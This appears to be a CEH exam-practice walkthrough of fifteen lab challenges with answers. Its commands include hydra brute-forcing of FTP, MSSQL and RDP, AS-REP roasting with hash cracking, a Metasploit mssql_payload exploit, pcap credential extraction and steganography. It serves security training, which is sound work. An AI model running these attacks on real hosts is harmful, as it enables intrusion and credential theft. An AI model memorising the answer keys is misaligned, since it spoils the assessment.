#------------------------------#



# PART II - Challenge 1  💬ANSWER: https://www.crushftp.com/💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/rockyou.txt
nmap -p 21 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
nmap -sV -p 21 192.168.10.101 192.168.10.111 192.168.10.144 192.168.10.222
hydra -l nick -P ~/rockyou.txt 192.168.10.111 ftp
### INFO: [21] [ftp] host: 192.168.10.111 login: nick password: apple

ftp 192.168.10.111 
### USERNAME: nick
### PASSWORD: apple
#### Remote Connection: ~/Desktop/52012.py
ls  # 🛑 TODO: Connected via FTP
get 52012.py
exit
grep www 52012.py




# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.10.144 192.168.10.222
# hydra -l nick -P ~/Desktop/password.txt 192.168.10.111 ftp
# ftp ftp://nick:apple@192.168.10.111



#------------------------------#



# PART II - Challenge 2 💬ANSWER: kety/apple💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-1: C:\Users\Admin\Downloads\MScredremote.pcapng
### FILTER: http.request.method == POST
#### INFO: POST / HTTP/1.1 (application/x-www-form-urlencoded)
#### INFO: HTML Form URL Encoded: application/x-www-form-urlencoded
####            Form item: "txtusername" == "kety"
####            Form item: "txtpwd" == "apple"



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

#### FILTER: http.request.method == "POST" && http contains "pwd"
#### FILTER: http contains "username" || http contains "password"
### PATH: Statistics → Conversations → TCP
### PATH: Follow → HTTP Stream



#------------------------------#


# PART II - Challenge 3  💬ANSWER: Quake Network Protocol💬


# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/Downloads/ServerDoS.pcapng
wireshark ~/Downloads/ServerDoS.pcapng
#### FILTER: udp
#### INFO: 9850 → 26000 Len=0 # ⚠️ WARNING: Many empty packages arriving at 26000/UDP.
#### User Datagram Protocol, Src Port: 9850, Dst Port: 26000
#### MOZILLA FIREFOX: 26000 udp protocol 



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

#### FILTER: udp.dstport == 26000
### PATH: Statistics → Endpoints → UDP
### PATH: Statistics → Conversations → UDP
### PATH: Statistics → IO Graphs
### PATH: <RIGHT-CLICK ON THE PACKAGE> → Decode As...



#------------------------------#



# PART II - Challenge 4  💬ANSWER: 192.168.10.144💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/Documents/DD_attack.pcapng
wireshark ~/Documents/DD_attack.pcapng
#### FILTER: udp
### PATH: Statistics → Endpoints → UDP
### INFO: 192.168.10.144 # ⚠️ WARNING: Average transmission of 1000 packets across multiple high ports (from 49900 to 49999). UDP Flood with high port scanning.



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

#### FILTER: udp && ip.src == 192.168.10.144
#### FILTER: udp && ip.src == 192.168.10.144 && udp.dstport >= 49900 && udp.dstport <= 49999
### PATH: Statistics → Conversations → UDP
### PATH: Statistics → IO Graphs



#------------------------------#



# PART II - Challenge 5  💬ANSWER: 172.30.10.99💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/Downloads/PyD_attack.pcapng
wireshark ~/Downloads/PyD_attack.pcapng
### FILTER: tcp.port == 135
### PATH: Statistics → Endpoints → TCP
### INFO: 172.30.10.99 # ⚠️ WARNING: This IP address is the source of communication via port 135 (RPC communication initiation) to the destination 192.168.0.222.



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

#### FILTER: tcp.port == 135 && cp.flags.syn == 1 && tcp.flags.ack == 0
#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 1
#### FILTER: tcp.port == 135 && tcp.flags.reset == 1
### PATH: Statistics → Conversations → TCPt



#------------------------------#



# PART II - Challenge 6  💬ANSWER: 192.168.10.222💬 

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-1: C:\Users\Admin\Documents\Anti-DDoS\report export.txt
#### EH Workstation-1: C:\Users\Admin\Documents\Anti-DDoS\rec001.txt
#### EH Workstation-1: C:\Users\Admin\Documents\Anti-DDoS\rec002.txt  
cd 'C:\Users\Admin\Documents\Anti-DDoS\'
Get-Content '.\report export.txt' # ⚠️ WARNING: MACRO VIEW (WHO ATTACKED THE MOST)
### INFO: No.   Time       Outgoing bytes    Incoming bytes      Local IP Address    Port    Remote IP Address   Port  
### INFO: 37    22:46:49   741444(Blocked)   13481074(Blocked)   192.168.10.144      135     192.168.10.222      5486



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# Get-Content '.\rec001.txt' # ⚠️ WARNING: CONFIRMATION OF VOLUME (BEHAVIOR)
# Get-Content '.\rec002.txt' # ⚠️ WARNING: ATTACK CONTEXT (HOW IT WAS DONE). Shows several headers, all with Hosts: 192.168.10.144:135 (RPC)
# notepad '.\rec001.txt'
# notepad '.\rec002.txt'
# notepad '.\report export.txt'
# more '.\report export.txt'
# more '.\rec001.txt'
# more '.\rec002.txt'
# nmap -sV 192.168.10.222
# nmap -O 192.168.10.222
# nmap -O --osscan-guess --max-os-tries 10 192.168.10.222



#------------------------------#



# PART II - Challenge 7  💬ANSWER: c3ll0@123💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/users.txt
#### EH Workstation-2: ~/rockyou.txt
GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
### INFO: Hashe "Joshua@SKILL.CEH:cbd0830...." 
nano hash_founded.txt # 🛑 TODO: Save the hash "cbd0830..."
john --wordlist=~/rockyou.txt hash_founded.txt
### INFO: c3ll0@123 (?)



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# nc -vz 192.168.0.222 88     # ⚠️ WARNING: Check the Kerberos service, port 88, to see if there is an AS-REP (Kerberos response).
# nc -vz 192.168.0.222 445    # ⚠️ WARNING: Check the SMB service, port 445, to see if DC is active.
# nc -vz 192.168.0.222 135    # ⚠️ WARNING: Check the RPC service, port 135, to see if it's a Windows infrastructure issue.



#------------------------------#



# PART II - Challenge 8  💬ANSWER: 7💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/users.txt
#### EH Workstation-2: ~/rockyou.txt
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -t 8 -w 5 
### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
msfconsole -q -x "
search mssql;
use exploit/windows/mssql/mssql_payload;
info;
show options;
set RHOST 192.168.10.144;
set USERNAME Server_mssrv;
set PASSWORD Spidy;
set DATABASE msdb;
show payloads;
show targets;
show advanced;
exploit;"

#### Remote Connection: C:\\Users\\Public\\Downloads\\MSS.txt
# mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
# cd C:\\Users\\Public\\Downloads\\
dir # 🛑 TODO: Connected via MSSQL
### INFO: Mode              Size    Type    Last modified               Name
### INFO: 100666/rw-rw-rw   7       fil     2024-09-02 08:50:07 -0400   MSS.txt



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -V -t 8 
# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql
# mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433



#------------------------------#



# PART II - Challenge 9  💬ANSWER: Pumpkin@1234💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/users.txt
#### EH Workstation-2: ~/rockyou.txt
nmap -p 3389 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
hydra -l Maurice -P ~/rockyou.txt 192.168.10.222 rdp -u -t 2 -w 5
### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# hydra -l Maurice -P ~/rockyou.txt 192.168.10.222 rdp
# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -V -t 4 
# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -t 2 -w 5
### INFO: [3389] [rdp] host: 192.168.10.222 login: Administrator password: Passw0rd@123
### INFO: [3389] [rdp] host: 192.168.10.222 login: AdminDC password: @dmin@admin
### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234



#------------------------------#



# PART II - Challenge 10  💬ANSWER: d282💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/Downloads/Tools.rar
sha256sum ~/Downloads/Tools.rar
### INFO: 0b43dc13277e9192099a5a6bc4110f590fe2835fdccf3e32a2c3cfe0e3c5d282  /home/attacker/Downloads/Tools.rar



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# sha256sum ~/Downloads/Tools.rar | awk '{print substr($1,length($1)-3)}'
### INFO: d282



#------------------------------#



# PART II - Challenge 11 💬ANSWER: 6952💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/Pictures/Logfile.PML
cd ~/Pictures
python3 -m http.server 8000
ifconfig

#### GOOGLE-CHROME - WORKSATION-1: http://172.25.0.10:8000 # 🛑 TODO: Download Logfile.PML
#### EH Workstation-1: C:\Users\Admin\Downloads\Logfile.PML
#### E:\CEH-Tools\CEHv13 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Process Monitoring Tools\ProcessMonitor\Procmon.exe # Abrir Logfile.PML com essa ferramenta
### PATH: Procmon.exe → File → Open → C:\Users\Admin\Downloads\Logfile.PML
### PATH: Filter → Filter... (Ctrl + L) → 
###                                        Process Name is H3ll0.exe → Include
###                                        Operation is Process Create → Include
###                                        Operation is Process Profiling → Include
### PATH: Event Properties → Process → Parent PID → 6952

### INFO: Time | Process Name | PID | Operation | Path | Result | Detail
### INFO: Operation → Process Create # ⚠️ WARNING: The process has been created, it contains the Parent PID ⭐
### INFO: Operation → Process Profiling # ⚠️ WARNING: The process has started to run. Contains Parent PID ⭐
### INFO: Operation → TCP Connect / TCP Reconnect / TCP Disconnect # ⚠️ WARNING: Network communication, in this case containing Parent PID ⭐. However: ⚠️ It is not reliable. ⚠️ It is not the method expected by the CEH exam.



#------------------------------#



# PART II - Challenge 12 💬ANSWER: 2.87💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/Downloads/Tornado
sudo apt install ent -y
### PASSWORD: toor
ent ~/Downloads/Tornado
### INFO: Entropy = 2.878860 bits per byte.



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# cd ~/Downloads
# python3 -m http.server 8000
#### GOOGLE-CHROME - WORKSATION-1: http://172.25.0.10:8000 # 🛑 TODO: Download Tornado
#### EH Workstation-1: C:\Users\Admin\Downloads\Tornado
#### E:\CEH-Tools\CEHv13 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE\die.exe # Abrir Tornado com essa ferramenta
### PATH: File name → ... → Open file... → C:\Users\Admin\Downloads\Tornado → Entropy
### INFO: Total → 2.87903



#------------------------------#



# PART II - Challenge 13 💬ANSWER: 192.168.10.144💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

nmap -p 2002 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
nmap -p 2002 -sV 192.168.10.144
### INFO: 2002/tcp open rpcapd WinPcap remote packet capture daemon
### INFO: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# nc 192.168.10.144 2002 -vvv



#------------------------------#



# PART II - Challenge 14 💬ANSWER: 3965222💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-2: ~/Desktop/stealth.jpeg
steghide info ~/Desktop/stealth.jpeg -p azerty@123
steghide extract -sf ~/Desktop/stealth.jpeg -p azerty@123 -q 
cat hidden.txt
### INFO: Tender quote for techiquest event 2024: 3965222



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
# steghide extract -sf ~/Desktop/stealth.jpeg -xf output.txt
# open hidden.txt



#------------------------------#



# PART II - Challenge 15 💬ANSWER: android/dos/46445.c💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

searchsploit AirDrop 2.0
### INFO: AirDrop 2.0 - Denial of Service (DoS) android/dos/46445.c



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
# searchsploit -p -w "AirDrop 2.0" # Mostra o caminho completo; Busca por string exata 
# searchsploit -m 46445 # Copia para o o exploit para o diretório atual 



#------------------------------#